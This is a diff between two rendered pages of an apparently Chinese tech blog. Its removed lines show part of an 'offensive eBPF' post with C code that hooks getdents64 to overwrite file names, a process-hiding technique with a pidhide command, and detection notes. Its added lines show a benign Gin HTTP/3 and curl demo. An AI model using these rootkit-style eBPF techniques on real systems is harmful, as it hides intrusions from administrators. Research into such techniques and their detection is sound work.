+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nx">time</span><span class="p">.</span><span class="nf">Sleep</span><span class="p">(</span><span class="mi">5</span> <span class="o">*</span> <span class="nx">time</span><span class="p">.</span><span class="nx">Millisecond</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="n">bpf_map_delete_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dir_entries</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">tid</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="cm">/* Loop over directory entries */</span>
-</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">linux_dirent64</span> <span class="o">*</span> <span class="n">d_entry</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">short</span> <span class="kt">int</span>      <span class="n">d_reclen</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">short</span> <span class="kt">int</span>      <span class="n">d_name_len</span><span class="p">;</span> 
-</span></span><span class="line"><span class="cl">    <span class="kt">long</span>                    <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="kt">long</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">d_entry_base_addr</span> <span class="o">=</span> <span class="o">*</span><span class="n">dir_addr</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="kt">long</span>              <span class="n">ret</span>               <span class="o">=</span> <span class="n">ctx</span><span class="o">-&gt;</span><span class="n">ret</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="c1">//MAX_D_NAME_LEN == 128 - const isn&#39;t working with allocation here...
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">char</span> <span class="n">d_name</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>  
-</span></span><span class="line"><span class="cl">    <span class="kt">int</span>  <span class="n">count</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">d_type</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">)</span>   <span class="c1">// limitation for now, only examine the first 256 entries
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="n">bpf_printk</span><span class="p">(</span><span class="s">&#34;Loop %d: offset: %d, total len: %d&#34;</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">ret</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">offset</span> <span class="o">&gt;=</span> <span class="n">ret</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="p">{</span>
-</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="n">d_entry</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">linux_dirent64</span> <span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="n">d_entry_base_addr</span> <span class="o">+</span> <span class="n">offset</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="c1">// read d_reclen
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">bpf_probe_read_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">d_reclen</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">d_reclen</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">d_entry</span><span class="o">-&gt;</span><span class="n">d_reclen</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="c1">// skip if it&#39;s a directory entry
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">bpf_probe_read_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">d_type</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">d_type</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">d_entry</span><span class="o">-&gt;</span><span class="n">d_type</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">d_type</span> <span class="o">==</span> <span class="n">DT_DIR</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="p">{</span>
-</span></span><span class="line"><span class="cl">            <span class="n">offset</span> <span class="o">+=</span> <span class="n">d_reclen</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">            <span class="n">i</span><span class="o">++</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">            <span class="k">continue</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="c1">//read d_name
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">d_name_len</span> <span class="o">=</span> <span class="n">d_reclen</span> <span class="o">-</span> <span class="mi">2</span> <span class="o">-</span> <span class="p">(</span><span class="n">offsetof</span><span class="p">(</span><span class="k">struct</span> <span class="n">linux_dirent64</span><span class="p">,</span> <span class="n">d_name</span><span class="p">));</span>
-</span></span><span class="line"><span class="cl">        <span class="kt">long</span> <span class="n">success</span> <span class="o">=</span> <span class="n">bpf_probe_read_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">d_name</span><span class="p">,</span> <span class="n">MAX_D_NAME_LEN</span><span class="p">,</span> <span class="n">d_entry</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="n">success</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="p">{</span>
-</span></span><span class="line"><span class="cl">            <span class="n">offset</span> <span class="o">+=</span> <span class="n">d_reclen</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">            <span class="n">i</span><span class="o">++</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">            <span class="k">continue</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="n">bpf_printk</span><span class="p">(</span><span class="s">&#34;d_reclen: %d, d_name_len: %d, %s&#34;</span><span class="p">,</span> <span class="n">d_reclen</span><span class="p">,</span> <span class="n">d_name_len</span><span class="p">,</span> <span class="n">d_name</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="cm">/* match and overwrite */</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="n">d_name_len</span> <span class="o">&gt;</span> <span class="mi">7</span> <span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="p">{</span>	
-</span></span><span class="line"><span class="cl">            <span class="n">bpf_printk</span><span class="p">(</span><span class="s">&#34;** sys_enter_getdents64 ** OVERWRITING&#34;</span><span class="p">);</span> 		
-</span></span><span class="line"><span class="cl">            
-</span></span><span class="line"><span class="cl">            <span class="kt">char</span> <span class="n">replace</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&#34;ruokeqx&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">            <span class="c1">// overwrite the user space d_name buffer
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="kt">long</span> <span class="n">success</span> <span class="o">=</span> <span class="n">bpf_probe_write_user</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">d_entry</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">replace</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">)</span> <span class="o">*</span> <span class="mi">7</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">            <span class="n">bpf_printk</span><span class="p">(</span><span class="s">&#34;** RESULT %d&#34;</span><span class="p">,</span> <span class="n">success</span><span class="p">);</span> 
-</span></span><span class="line"><span class="cl">        <span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        <span class="n">offset</span> <span class="o">+=</span> <span class="n">d_reclen</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        <span class="n">i</span><span class="o">++</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl">	
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">assert</span><span class="p">.</span><span class="nf">Error</span><span class="p">(</span><span class="nx">t</span><span class="p">,</span> <span class="nx">router</span><span class="p">.</span><span class="nf">RunQUIC</span><span class="p">(</span><span class="s">&#34;:8443&#34;</span><span class="p">,</span> <span class="s">&#34;./testdata/certificate/cert.pem&#34;</span><span class="p">,</span> <span class="s">&#34;./testdata/certificate/key.pem&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">testRequest</span><span class="p">(</span><span class="nx">t</span><span class="p">,</span> <span class="s">&#34;https://localhost:8443/example&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>运行结果如图 可以看到所有文件名都被修改了</p>
-<p><img src="/images/posts/offensive_bpf/image-20220620172918255.png" alt="image-20220620172918255" /></p>
-<h3 id="隐藏进程">隐藏进程</h3>
-<p>bad-bpf库提供的功能，思路很简单，显示就是遍历dir entry然后输出名字，下一个dir entry是当前dir entry+d_reclen，sys read hook处遍历的时候发现是自己的dir entry后把前一个的dir entry中d_reclen加上自己dir entry的d_reclen就实现了绕过了，返回到用户态会直接绕过这个entry。</p>
-<p><img src="/images/posts/offensive_bpf/image-20220620221936797.png" alt="image-20220620221936797" /></p>
+</div><h2 id="curl-http3">Curl http3</h2>
+<p>直接修改Gin源码添加RunQUIC函数支持http3，并编写简单server</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo ./pidhide -p <span class="m">3953</span>
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nx">main</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;net/http&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;github.com/gin-gonic/gin&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">router</span> <span class="o">:=</span> <span class="nx">gin</span><span class="p">.</span><span class="nf">New</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">router</span><span class="p">.</span><span class="nf">GET</span><span class="p">(</span><span class="s">&#34;/example&#34;</span><span class="p">,</span> <span class="kd">func</span><span class="p">(</span><span class="nx">c</span> <span class="o">*</span><span class="nx">gin</span><span class="p">.</span><span class="nx">Context</span><span class="p">)</span> <span class="p">{</span> <span class="nx">c</span><span class="p">.</span><span class="nf">String</span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">StatusOK</span><span class="p">,</span> <span class="s">&#34;ruokeqx http3 worked&#34;</span><span class="p">)</span> <span class="p">})</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">router</span><span class="p">.</span><span class="nf">RunQUIC</span><span class="p">(</span><span class="s">&#34;:8080&#34;</span><span class="p">,</span> <span class="s">&#34;./cert.pem&#34;</span><span class="p">,</span> <span class="s">&#34;./key.pem&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img src="/images/posts/offensive_bpf/image-20220623231529832.png" alt="image-20220623231529832" /></p>
-<h2 id="检测">检测</h2>
-<h3 id="detection-bpf">Detection: BPF</h3>
-<p>检测主要是围绕BPF()系统调用获取信息，当然需要确保你的工具获取的是正确的信息（因为你的工具可能被trace 甚至BPF系统调用可能被trace）</p>
-<p>最常见的就是内核中自带的工具bpftool，在<a href="/posts/bpf_performance_tools/">之前的文章</a>中也有写过</p>
-<p><img src="/images/posts/offensive_bpf/image-20220618210153114.png" alt="image-20220618210153114" /></p>
-<p>还有bpflist可以列出当前运行 BPF 的所有用户态程序，他也是一个BPF程序 在bcc的tools目录中</p>
-<p>如果已经源码安装过bcc不要再次使用apt包安装 极有可能会依赖损坏（别问我怎么知道）</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">➜  tools git:<span class="o">(</span>master<span class="o">)</span> <span class="nb">pwd</span>   
-</span></span><span class="line"><span class="cl">/home/ruokeqx/project/bcc/tools
-</span></span><span class="line"><span class="cl">➜  tools git:<span class="o">(</span>master<span class="o">)</span> ls <span class="p">|</span> grep bpflist
-</span></span><span class="line"><span class="cl">bpflist_example.txt
-</span></span><span class="line"><span class="cl">bpflist.py
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>需要注意的是如果恶意 BPF 程序在日志收集或检测工具运行之前开始运行，那么 BPF 程序可以将自身安装为 rootkit 以逃避检测。</p>
-<p>由于BPF不自启动，重启系统也是关闭BPF程序的一种方法</p>
-<p>一些性能检测工具或许会有供应链攻击隐患</p>
-<h3 id="detectionbpf_probe_write_user">Detection：bpf_probe_write_user</h3>
-<p>bpf_probe_write_user 调用的时候会生成syslog</p>
-<p>理论上跟hook BPF系统调用类似 也可以通过hook来bypass syslog</p>
-<h2 id="reference">Reference</h2>
-<p><a href="https://embracethered.com/blog/posts/2021/offensive-bpf/">https://embracethered.com/blog/posts/2021/offensive-bpf/</a></p>
-<p><a href="https://embracethered.com/blog/posts/2021/offensive-bpf-bpftrace/">https://embracethered.com/blog/posts/2021/offensive-bpf-bpftrace/</a></p>
-<p><a href="https://embracethered.com/blog/posts/2021/offensive-bpf-bpftrace-message-based/">https://embracethered.com/blog/posts/2021/offensive-bpf-bpftrace-message-based/</a></p>
-<p><a href="https://embracethered.com/blog/posts/2021/offensive-bpf-libbpf-bpf_probe_write_user/">https://embracethered.com/blog/posts/2021/offensive-bpf-libbpf-bpf_probe_write_user/</a></p>
-<p><a href="https://nakryiko.com/posts/libbpf-bootstrap">https://nakryiko.com/posts/libbpf-bootstrap</a></p>
-<p><a href="https://tech.meituan.com/2022/04/07/how-to-detect-bad-ebpf-used-in-linux.html">https://tech.meituan.com/2022/04/07/how-to-detect-bad-ebpf-used-in-linux.html</a></p>
-<p><a href="https://github.com/pathtofile/bad-bpf">https://github.com/pathtofile/bad-bpf</a></p>
-<p><a href="https://cloud.tencent.com/developer/inventory/600/article/1626925">https://cloud.tencent.com/developer/inventory/600/article/1626925</a></p>
-<p><a href="https://github.com/xdp-project/xdp-tutorial">https://github.com/xdp-project/xdp-tutorial</a></p>
-<p><a href="https://arthurchiao.art/blog/understanding-ebpf-datapath-in-cilium-zh/">https://arthurchiao.art/blog/understanding-ebpf-datapath-in-cilium-zh/</a></p>
-<p><a href="https://paper.seebug.org/1867/">https://paper.seebug.org/1867/</a></p>
-<p><a href="https://security.tencent.com/index.php/blog/msg/206">https://security.tencent.com/index.php/blog/msg/206</a></p>
+</div><p>手动编译[5]支持http3的curl进行访问，编译的时候要注意点是<code>&lt;somewhere1&gt;/lib</code>实际上是<code>&lt;somewhere1&gt;/lib64</code> 否则会编译出错[5]</p>
+<p><img src="/images/posts/QUIC&amp;HTTP3_DEMO/image-20220709132919677.png" alt="image-20220709132919677" /></p>
+<h2 id="ref">Ref</h2>
+<p>[1] <a href="https://en.wikipedia.org/wiki/Head-of-line_blocking">wiki HOL blocking</a></p>
+<p>[2] <a href="https://network.51cto.com/article/625999.html">图解|为什么HTTP3.0使用UDP协议</a></p>
+<p>[3] <a href="https://github.com/gin-gonic/gin/pull/3210/files">Gin PR 3210 experimental: support http3</a></p>
+<p>[4] <a href="https://blog.cloudflare.com/http3-the-past-present-and-future/">Cloudflare http3</a></p>
+<p>[5] <a href="https://github.com/curl/curl/blob/master/docs/HTTP3.md">build http3 curl</a></p>
+<p>[6] <a href="https://en.wikipedia.org/wiki/HTTP/3">Wiki http3</a></p>
 
     </article>
     
@@ -2777,15 +2237,11 @@ kretprobe:inet_csk_accept
         </li>
         
         <li>
-          <a href="/posts/bpf_performance_tools/" class="related__link">BCC、bpftrace &amp;&amp; BPF Performance Tools</a>
-        </li>
-        
-        <li>
           <a href="/posts/bpf_uprobe_bypass_go_tls/" class="related__link">eBPF Uprobe bypass Go tls——抓取https明文流量</a>
         </li>
         
         <li>
-          <a href="/posts/dll_injection_and_dll_hijacking/" class="related__link">DLL注入及DLL劫持简单学习</a>
+          <a href="/posts/cap%E6%A0%BC%E5%BC%8F/" class="related__link">pcap和pcapng格式的一点研究</a>
         </li>
         
     </ul>
@@ -2795,21 +2251,14 @@ kretprobe:inet_csk_accept
 <nav class="pagination-single">
   
     
-      <a href="https://ruokeqx.gitee.io/posts/ebpf_bypass_iptables/" class="pagination-single__left">
+      <a href="https://ruokeqx.gitee.io/posts/offensive_bpf/" class="pagination-single__left">
         <div class="pagination-single__icon">
           <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path fill="currentColor" d="M19 11H7.83l4.88-4.88c.39-.39.39-1.03 0-1.42-.39-.39-1.02-.39-1.41 0l-6.59 6.59c-.39.39-.39 1.02 0 1.41l6.59 6.59c.39.39 1.02.39 1.41 0 .39-.39.39-1.02 0-1.41L7.83 13H19c.55 0 1-.45 1-1s-.45-1-1-1z"/></svg>
         </div>
-        <div class="pagination-single__left-title">eBPF bypass iptables</div>      
+        <div class="pagination-single__left-title">offensive eBPF——使用BPF后门、修改文件、隐藏进程</div>      
       </a>
     
     <div class="grow"></div>
-    
-      <a href="https://ruokeqx.gitee.io/posts/quichttp3_demo/" class="pagination-single__right">      
-        <div class="pagination-single__right-title">浅尝QUIC和HTTP3</div>
-        <div class="pagination-single__icon">
-          <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path fill="currentColor" d="M5 13h11.17l-4.88 4.88c-.39.39-.39 1.03 0 1.42.39.39 1.02.39 1.41 0l6.59-6.59c.39-.39.39-1.02 0-1.41l-6.58-6.6c-.39-.39-1.02-.39-1.41 0-.39.39-.39 1.02 0 1.41L16.17 11H5c-.55 0-1 .45-1 1s.45 1 1 1z"/></svg>
-        </div>
-      </a>
     
   
 </nav>
@@ -3165,40 +2614,12 @@ document.addEventListener('DOMContentLoaded', function () {
   <div class="toc hide" data-dir="ltr" data-folding="true" data-ani="true">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#bpf综述">BPF综述</a>
-      <ul>
-        <li><a href="#bpf功能">BPF功能</a></li>
-        <li><a href="#加载bpf程序">加载BPF程序</a></li>
-        <li><a href="#bpf安全相关">BPF安全相关</a></li>
-        <li><a href="#btf">BTF</a></li>
-        <li><a href="#xdp">XDP</a></li>
-        <li><a href="#libbpf--libbpf-bootstrap">libbpf &amp;&amp; libbpf-bootstrap</a></li>
-      </ul>
-    </li>
-    <li><a href="#bpftrace-backdoor">bpftrace backdoor</a>
-      <ul>
-        <li><a href="#validator">Validator</a></li>
-        <li><a href="#backdoor">Backdoor</a>
-          <ul>
-            <li><a href="#小坑">小坑</a></li>
-            <li><a href="#最终代码">最终代码</a></li>
-          </ul>
-        </li>
-      </ul>
-    </li>
-    <li><a href="#malicious-bpf">Malicious bpf</a>
-      <ul>
-        <li><a href="#修改文件名">修改文件名</a></li>
-        <li><a href="#隐藏进程">隐藏进程</a></li>
-      </ul>
-    </li>
-    <li><a href="#检测">检测</a>
-      <ul>
-        <li><a href="#detection-bpf">Detection: BPF</a></li>
-        <li><a href="#detectionbpf_probe_write_user">Detection：bpf_probe_write_user</a></li>
-      </ul>
-    </li>
-    <li><a href="#reference">Reference</a></li>
+    <li><a href="#http概述">HTTP概述</a></li>
+    <li><a href="#http3的优化">HTTP3的优化</a></li>
+    <li><a href="#现有库实现">现有库实现</a></li>
+    <li><a href="#gin的http3支持">Gin的HTTP3支持</a></li>
+    <li><a href="#curl-http3">Curl http3</a></li>
+    <li><a href="#ref">Ref</a></li>
   </ul>
 </nav>
   </div>
